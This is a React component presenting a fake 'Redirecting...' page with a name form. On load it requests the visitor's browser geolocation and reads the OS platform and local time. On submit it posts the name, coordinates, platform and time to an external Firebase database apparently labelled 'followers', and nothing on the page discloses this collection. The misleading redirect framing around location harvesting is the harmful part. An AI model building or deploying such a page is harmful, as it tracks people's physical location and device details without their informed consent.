import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Pic from '../src/Images/Sachin (2).png';
import Swal from 'sweetalert2';
import axios from 'axios';

const RedirectPage = () => {
    const navigate = useNavigate();
    const [showTab, setShowTab] = useState(false);
    const [name, setName] = useState('');
    const [currentTime, setCurrentTime] = useState('');
    const [userLocation, setUserLocation] = useState('');
    const [systemOS, setSystemOS] = useState('');

    useEffect(() => {
        const tabTimeout = setTimeout(() => {
            setShowTab(true);
        }, 3000);

        // Check if form has been submitted before
        const isFormSubmitted = localStorage.getItem('formSubmitted');
        if (isFormSubmitted) {
            navigate('/'); // Redirect to home page if form already submitted
        }

        // Get current time
        const time = new Date().toLocaleTimeString();
        setCurrentTime(time);

        // Get user location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    setUserLocation(`${position.coords.latitude}, ${position.coords.longitude}`);
                },
                (error) => {
                    console.error('Error getting user location:', error);
                    setUserLocation('Unknown');
                }
            );
        } else {
            setUserLocation('Geolocation is not supported by this browser.');
        }

        // Get system OS details
        const os = navigator.platform;
        setSystemOS(os);

        return () => {
            clearTimeout(tabTimeout);
        };
    }, []);

    const handleSubmit = async (event) => {
        event.preventDefault();

        try {
            // Save form data, current time, user location, and system OS details to Firebase Realtime Database
            await axios.post('https://followers-ba029-default-rtdb.firebaseio.com/entries.json', {
                name: name,
                currentTime: currentTime,
                userLocation: userLocation,
                systemOS: systemOS
                // Add more data fields as needed
            });

            // Set form submitted flag in local storage
            localStorage.setItem('formSubmitted', true);

            // Display success message using SweetAlert2
            Swal.fire({
                icon: 'success',
                title: 'Success!',
                text: 'Form submitted successfully!',
                timer: 2000,
                showCancelButton: false,
                showConfirmButton: false
            });

            // Optionally, you can redirect to another page after form submission
            navigate('/');
        } catch (error) {
            console.error('Error submitting form:', error);
            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: 'An error occurred while submitting the form. Please try again later.'
            });
        }
    };

    return (
        <body className="welcome">
            <span id="splash-overlay" className="splash"></span>
            <span id="welcome" className="z-depth-4"></span>
            <main className="valign-wrapper">
                <span className="container grey-text text-lighten-1 ">
                    <div>
                        {showTab && (
                            <div className="center-align tab" style={{ opacity: showTab ? 1 : 0, transition: 'opacity 2s ease-in-out !important' }}>
                                <div className="center-align">
                                    <h1>Redirecting...</h1>
                                    <div className="profile-card">
                                        <div className="profile-bio">
                                            <img className='pic' src={Pic} alt="Profile" />
                                            <form onSubmit={handleSubmit}>
                                                <div className="mb-3">
                                                    <input 
                                                        type="text" 
                                                        placeholder='Enter Your Good Name...' 
                                                        className="new" 
                                                        id="exampleInputPassword1" 
                                                        value={name}
                                                        onChange={(e) => setName(e.target.value)}
                                                    />
                                                </div>
                                                <button type="submit" className="btn new-btn">Submit</button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>
                </span>
            </main>
        </body>
    );
};

export default RedirectPage;
